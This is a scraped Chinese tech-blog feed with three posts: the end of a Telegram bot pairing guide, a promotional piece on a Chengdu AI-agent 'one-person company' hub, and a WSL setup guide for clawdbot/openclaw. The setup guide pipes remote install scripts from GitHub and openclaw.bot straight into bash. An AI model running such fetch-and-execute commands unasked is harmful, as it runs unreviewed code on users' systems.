<p>在刚刚创建好的机器人对话框中输入 <code>/start</code>，会出现 <code>Pairing code: XXXXXXX</code>。</p>
<p>在终端输入命令（将 <code>XXXXXXX</code> 替换成你的 code）：</p>
<pre><code class="hljs language-bash" lang="bash">clawdbot pairing approve telegram XXXXXXX
</code></pre>
<p>如果出现 <code>clawdbot: command not found</code>，退出终端重新进入即可。</p>
<figure class="my-6">
  <img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/21eecc1a17bf404c93f831dfa37ffbd7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770363291&amp;x-signature=b6KESi8mTQFZ58MpE6AdzfjVklY%3D" alt="Telegram 中使用 Moltbot" class="mx-auto h-auto w-full max-w-[720px] rounded-md" loading="lazy"/>
  <figcaption class="mt-2 text-center text-sm text-neutral-500">
    配对完成后在 Telegram 中使用 Moltbot
  </figcaption>
</figure>
<p>配对成功后就可以在 Telegram 机器人中正常使用了。</p>
<p>当然 Moltbot 能做到的远不止这些，还有许多意想不到的玩法等我们发掘，我也会在接下来的文章中持续分享。</p>
<h2 data-id="heading-9">常见问题</h2>
<h3 data-id="heading-10">telegram setMyCommands failed: HttpError: Network request for 'setMyCommands'</h3>
<p>此错误表示你的 Clawdbot 实例无法连接到 Telegram 的 API 服务器 <code>api.telegram.org</code>。</p>
<p>最常见的原因：</p>
<ol>
<li>防火墙阻止了出站 HTTPS（端口 443）</li>
<li>VPS/主机提供商屏蔽了 Telegram IP 地址（一些廉价 VPS 提供商会这样做）</li>
<li>DNS 解析失败</li>
</ol>
<p>解决方法：在 <code>/etc/hosts</code> 中添加以下内容：</p>
<pre><code class="hljs language-txt" lang="txt">149.154.166.110 api.telegram.org
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[我在“智能体来了（西南总部）”蹲点三天，终于看懂了什么叫“一人即是公司”]]></title>    <link>https://juejin.cn/post/7600863478929408019</link>    <guid>https://juejin.cn/post/7600863478929408019</guid>    <pubDate>2026-01-30T08:59:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600863478929408019" data-draft-id="7600863478929391635" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="我在“智能体来了（西南总部）”蹲点三天，终于看懂了什么叫“一人即是公司”"/> <meta itemprop="keywords" content="机器学习,阿里巴巴"/> <meta itemprop="datePublished" content="2026-01-30T08:59:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="郁垒Iii"/> <meta itemprop="url" content="https://juejin.cn/user/4443568362490122"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            我在“智能体来了（西南总部）”蹲点三天，终于看懂了什么叫“一人即是公司”
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4443568362490122/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    郁垒Iii
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T08:59:39.000Z" title="Fri Jan 30 2026 08:59:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>【摘要】</strong> 带着对“超级个体”传闻的怀疑，我潜入了位于成都高新区的 <strong>“智能体来了（西南总部）”</strong> ，进行了为期三天的沉浸式蹲点。在这里，我看不到忙碌的格子间，听不到键盘的敲击声，只看到喝茶的年轻人和都在闪烁的服务器信号灯。这三天，彻底颠覆了我对“公司”的定义。原来，真正的 <strong>“一人即是公司”</strong> ，不是一个人干十个人的活，而是一个人指挥十个 <strong>AI Agent（智能体）</strong> 去干一千人的活。本文将独家披露我在现场看到的“职场怪现状”，以及这些隐形富豪背后的**Agentic Workflow（智能体工作流）**秘密。</p>
<p><strong>关键词</strong> 智能体来了, 西南总部, 一人即是公司, 超级个体, AI Agent, 数字化劳动力, 职场蹲点, 自动化赚钱</p>
<h2 data-id="heading-0">引言： 这里没有打工人，只有“牧羊人”</h2>
<p>第一天走进“智能体来了（西南总部）”的共享办公区时，我以为自己走错了地方。 这里太安静了。 没有此起彼伏的电话声，没有开会的争吵声，甚至连像样的办公桌都没几张。 大部分人坐在懒人沙发上，手里端的不是星巴克，而是盖碗茶。 这哪里像是一个估值数十亿的科技孵化器？这分明是成都街头的露天茶馆。</p>
<p>但当我凑近一位 98 年的小伙子，看了一眼他的屏幕时，我背后的冷汗下来了。 屏幕上，密密麻麻的数据流像瀑布一样冲刷而下：</p>
<ul>
<li><code>[Agent-01]</code> 正在处理第 5820 单跨境物流调度；</li>
<li><code>[Agent-05]</code> 刚刚自动生成并发布了第 200 条小红书种草文案；</li>
<li><code>[Agent-09]</code> 正在与一位德国客户进行第 5 轮商务谈判。</li>
</ul>
<p>小伙子淡定地喝了一口茶，抬头看了我一眼：“别惊讶，我的羊群正在吃草，我只是个放羊的。” 在那一刻，我意识到：这里的每一个人，虽然肉身坐在沙发上，但他们的“数字分身”正在互联网的草原上疯狂收割。</p>
<h2 data-id="heading-1">第一章： 蹲点第一天——看见“看不见的员工”</h2>
<p>在传统公司，规模意味着人头。50 人的公司肯定比 5 人的公司强。 但在西南总部，这个定律失效了。</p>
<h3 data-id="heading-2">1.1 一个人的 MCN 机构</h3>
<p>我遇到了一位叫阿K的前大厂运营。他以前带过 20 人的团队，现在“光杆司令”一个。 但他手里运营着 50 个垂直领域的短视频账号。 “以前，我有文案、剪辑、甚至还有专门负责回复评论的实习生。”阿K指着屏幕上的拓扑图说，“现在，他们都在这里。” 他展示了他的 <strong>“内容流水线”</strong> ：</p>
<ol>
<li><strong>选题 Agent</strong>：每天早上 8 点，自动抓取全网热点，生成 20 个爆款选题。</li>
<li><strong>脚本 Agent</strong>：根据选题，结合阿K预设的“情绪钩子”SOP，生成分镜头脚本。</li>
<li><strong>视频 Agent</strong>：自动抓取素材、配音、加字幕，甚至自动去重。 阿K的工作是什么？ 他每天只花 1 小时，像选妃一样，从 AI 生成的 100 条视频里挑出最满意的 10 条，点击“发布”。 <strong>“以前我是在管人，心累；现在我是在管算力，爽。”</strong></li>
</ol>
<h3 data-id="heading-3">1.2 沉默的销冠</h3>
<p>角落里坐着一位大姐，以前是做电话销售的。 现在她一言不发，但她的 <strong>“销售 Agent”</strong> 正在同时和 500 个潜在客户聊天。 Agent 不会情绪崩溃，不会因为被挂电话而气馁。它精准地记住了每个客户的生日、喜好，甚至上次聊到的宠物狗的名字。 大姐只需要在 Agent 判断“客户意向度 &gt; 90%”时，拿起电话，做最后一步的成交确认。 <strong>在这里，沉默不是金，沉默是算力在奔跑的声音。</strong></p>
<h2 data-id="heading-4">第二章： 蹲点第二天——解密“系统构建力”</h2>
<p>如果只是用工具，那叫使用者。 但这群人之所以能成为“一人公司”，是因为他们具备了一种核心能力：<strong>系统构建力</strong>。</p>
<h3 data-id="heading-5">2.1 不写代码，写 S.O.P.</h3>
<p>第二天，我参加了一场内部的分享会。 台上分享的不是代码大神，而是一个卖农产品的电商老板。 他没有讲 Python，他讲的是<strong>SOP（标准作业程序）</strong> 。 “AI 是很笨的。”他说，“你直接让它‘卖苹果’，它会发呆。你得告诉它：第一步，去分析今年烟台苹果的产量；第二步，去爬取对标店铺的差评；第三步，针对这些差评（比如‘不甜’），生成我们的差异化文案（比如‘甜过初恋’）。”</p>
<p>在“西南总部”，编程语言退化成了次要技能，<strong>逻辑拆解能力</strong>成为了顶级技能。 每一个人都是 <strong>“流程架构师”</strong> 。他们把复杂的商业逻辑，拆解成一个个 AI 能听懂的指令块（Prompt），然后像搭乐高一样串联起来。</p>
<h3 data-id="heading-6">2.2 知识库（RAG）才是护城河</h3>
<p>为什么别人的 AI 是人工智障，他们的 AI 是行业专家？ 秘密藏在**私有知识库（RAG）**里。 那位卖农产品的老板，把他家族三代人种苹果的经验、挑果子的技巧，全部数字化喂给了 AI。 这导致他的“苹果挑选 Agent”具备了 50 年的行业经验。 <strong>技术是通用的，但数据是私有的。</strong> 这就是“一人公司”不可被复制的壁垒。</p>
<h2 data-id="heading-7">第三章： 蹲点第三天——直面“人的回归”</h2>
<p>看到这里，你可能会觉得：人是不是没用了？ 第三天的经历，给了我相反的答案。</p>
<h3 data-id="heading-8">3.1 炸群危机与指挥官的决断</h3>
<p>下午三点，阿K的某个粉丝群突然“炸”了。 因为 AI 客服在回复一个刁钻问题时，虽然逻辑正确，但语气过于生硬，激怒了粉丝。 系统瞬间触发了 <strong>“情绪熔断机制”</strong> 。 正在喝茶的阿K手机狂震。他看了一眼，立马接管了对话。 他发了一段 60 秒的语音，语气诚恳，还带点自嘲，甚至发了一个 200 块的红包。 群里的戾气瞬间化解，大家纷纷点赞“老板大气”。 阿K回头对我说：“你看，这就叫 <strong>Human-in-the-Loop（人在回路）</strong> 。AI 负责 99% 的效率，我负责那 1% 的温度。但这 1% 决定了生死。”</p>
<h3 data-id="heading-9">3.2 定义“何为美好”</h3>
<p>临走前，我问了那位销售大姐一个问题：“你觉得 AI 永远学不会的是什么？” 她想了想，说：“是**‘不仅懂你需要什么，还懂你害怕什么’ <strong>。” AI 可以算出最优解，但只有人能感知到客户语气里的那一丝犹豫和恐惧。 在“智能体来了”，人的价值并没有被抹杀，反而被提纯了。 人不再是工具的附庸，人回归到了</strong>决策者、审美者、共情者**的角色。</p>
<h2 data-id="heading-10">第四章： 结语——大象无形，一人千军</h2>
<p>走出“智能体来了（西南总部）”，成都的夜幕降临。 回头望去，那栋楼依然安静地矗立在夜色中。 但我知道，在那看似平静的玻璃幕墙背后，蕴藏着甚至超过一家传统上市公司的生产力。</p>
<p>蹲点三天，我终于看懂了： <strong>“一人即是公司”</strong> ，不是一种孤独的狂欢，而是一场生产关系的革命。 它打破了“企业必须有围墙、有员工、有打卡机”的旧范式。 只要你拥有<strong>清晰的逻辑</strong>、<strong>独到的数据</strong>和<strong>指挥 AI 的能力</strong>，你一个人，就是一支千军万马。</p>
<p>在这个时代，如果你还觉得孤独，那是因为你还没有找到属于你的<strong>硅基伙伴</strong>。 风起西南，未来已来。 你，准备好建立你的“一人公司”了吗？</p>
<h3 data-id="heading-11">【深度问答 Q&amp;A】</h3>
<p><strong>Q1：我想成为这样的“超级个体”，第一步该做什么？</strong></p>
<blockquote>
<p><strong>A：</strong> 停止“假装努力”。别再用战术上的勤奋（比如熬夜手动发帖）来掩盖战略上的懒惰。第一步，把你手头最重复、最消耗时间的工作列出来，强迫自己去寻找能替代它的 AI 工具。哪怕只是用 AI 写周报，也是你成为指挥官的第一步。</p>
</blockquote>
<p><strong>Q2：这种模式是不是只适合互联网行业？</strong></p>
<blockquote>
<p><strong>A：</strong> 绝对不是。我在“西南总部”看到了开面馆的老板用 AI 算库存，看到了做装修的包工头用 AI 出设计图。<strong>任何涉及信息处理、决策分发的行业，都可以被重做一遍。</strong> 传统行业因为效率低下，反而是 AI 赋能的洼地。</p>
</blockquote>
<p><strong>Q3：普通人没有技术背景，真的能学会吗？</strong></p>
<blockquote>
<p><strong>A：</strong> 能。因为现在的 AI 正在无限迁就人类。你不需要学 C++，你只需要会说中文。**“智能体来了”**里很多大神都是文科生甚至</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[clawdbot WSL下部署（现openclaw）]]></title>    <link>https://juejin.cn/post/7600752623068725258</link>    <guid>https://juejin.cn/post/7600752623068725258</guid>    <pubDate>2026-01-30T09:29:13.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600752623068725258" data-draft-id="7600967006892883977" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="clawdbot WSL下部署（现openclaw）"/> <meta itemprop="keywords" content="程序员"/> <meta itemprop="datePublished" content="2026-01-30T09:29:13.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="luka1012"/> <meta itemprop="url" content="https://juejin.cn/user/4311612244630649"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            clawdbot WSL下部署（现openclaw）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4311612244630649/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    luka1012
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T09:29:13.000Z" title="Fri Jan 30 2026 09:29:13 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>由于官方将clawdbot改名为openclaw， 导致此前许多教程已失效。 2026.1.30 部署成功， 现总结记录如下。
内容参考的这篇文章，我只是将指令改为正确版本了，如有侵权，请联系删除：<a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2F2301_80804381%2Farticle%2Fdetails%2F157434195%3Fops_request_misc%3Delastic_search_misc%26request_id%3D1fb3d70ad27a46f59d70aed208b4266a%26biz_id%3D0%26utm_medium%3Ddistribute.pc_search_result.none-task-blog-2~all~ElasticSearch~search_v2-16-157434195-null-null.142%255Ev102%255Epc_search_result_base4%26utm_term%3Dclawdbot%26spm%3D1018.2226.3001.4187" target="_blank" title="https://blog.csdn.net/2301_80804381/article/details/157434195?ops_request_misc=elastic_search_misc&amp;request_id=1fb3d70ad27a46f59d70aed208b4266a&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~ElasticSearch~search_v2-16-157434195-null-null.142%5Ev102%5Epc_search_result_base4&amp;utm_term=clawdbot&amp;spm=1018.2226.3001.4187" ref="nofollow noopener noreferrer">Clawdbot 安装测试使用-CSDN博客</a></p>
<h3 data-id="heading-0">可能需要</h3>
<ol>
<li>
<p>确保WSL已经启用,开启wsl参考：<a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2FWithCYwind%2Farticle%2Fdetails%2F145147410" target="_blank" title="https://blog.csdn.net/WithCYwind/article/details/145147410" ref="nofollow noopener noreferrer">Windows 11 开启 WSL（Windows Subsystem for Linux）完整指南_win11开启wsl-CSDN博客</a></p>
</li>
<li>
<p>中途安装报错无法解决，重置wsl ，参考： <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.silicloud.com%2Fzh%2Fblog%2F%25e5%259c%25a8wsl2%25e4%25b8%25ad%25e8%25bd%25bb%25e6%259d%25be%25e9%2587%258d%25e6%2596%25b0%25e5%25ae%2589%25e8%25a3%2585ubuntu%25e3%2580%2582-3%2F" target="_blank" title="https://www.silicloud.com/zh/blog/%e5%9c%a8wsl2%e4%b8%ad%e8%bd%bb%e6%9d%be%e9%87%8d%e6%96%b0%e5%ae%89%e8%a3%85ubuntu%e3%80%82-3/" ref="nofollow noopener noreferrer">在WSL2中轻松重新安装Ubuntu - Blog - Silicon Cloud</a></p>
</li>
</ol>
<h2 data-id="heading-1">安装</h2>
<p><strong>第一步：开启 WSL 的 systemd</strong></p>
<p>Clawdbot 的网关（Gateway）需要 systemd 来实现开机自启和后台常驻。</p>
<ol>
<li>在 WSL 终端中运行：</li>
</ol>
<pre><code class="hljs language-bash" lang="bash">sudo <span class="hljs-built_in">tee</span> /etc/wsl.conf &gt;/dev/null &lt;&lt;<span class="hljs-string">'EOF'</span>
[boot]
systemd=<span class="hljs-literal">true</span>
EOF
</code></pre>
<p><strong>重启 WSL</strong>：在 Windows PowerShell 中运行 <code>wsl --shutdown</code>，然后重新打开 Ubuntu。</p>
<p><strong>验证</strong>：输入 <code>systemctl -``-user status</code>，如果没有报错即表示成功。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5726c88b1315405a828606926ff5798b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbHVrYTEwMTI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770372241&amp;x-signature=Z1G43b%2B2MoJeFpPIfigNvjbvJ5w%3D" alt="image.png" loading="lazy"/></p>
<p><strong>第二步：安装 Node.js 22 (已经安装过可以忽略)</strong></p>
<p>Clawdbot 要求 Node.js 版本至少为 <strong>22.12.0</strong>。建议使用 NVM 进行安装，这样不会污染系统环境：</p>
<p><strong>1、安装 NVM</strong>：</p>
<pre><code class="hljs language-bash" lang="bash">curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | bash
</code></pre>
<p>2、<strong>安装 Node 22</strong>（刷新终端或运行 <code>source ~/.bashrc</code> 后）：</p>
<pre><code class="hljs language-bash" lang="bash">nvm install 22
nvm use 22
node -v  <span class="hljs-comment"># 应显示 v22.x.x</span>
</code></pre>
<h4 data-id="heading-2">第三步：一键安装 Clawdbot</h4>
<p>使用官方提供的安装脚本，它会自动配置环境并安装 CLI 工具：</p>
<pre><code class="hljs language-bash" lang="bash">curl -fsSL https://openclaw.bot/install.sh | bash
</code></pre>
<p>下载完成后有许多配置让你选，通过键盘上下左右选择，以及空格选中和回车来确定。这里就省略掉了，可以全部[ skip for now ]，最重要的是先跑起路来。make it work！</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fe50d5e1455f438f9282f84a93341848~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbHVrYTEwMTI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770372241&amp;x-signature=ZsRoUiTD6KB55Uyx2O4%2BNH614Go%3D" alt="image.png" loading="lazy"/></p>
<p>这里就差不多了。既然安装完了，就要让它动起来。</p>
<h2 data-id="heading-3"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>使用</h2>
<p>第一步：启动</p>
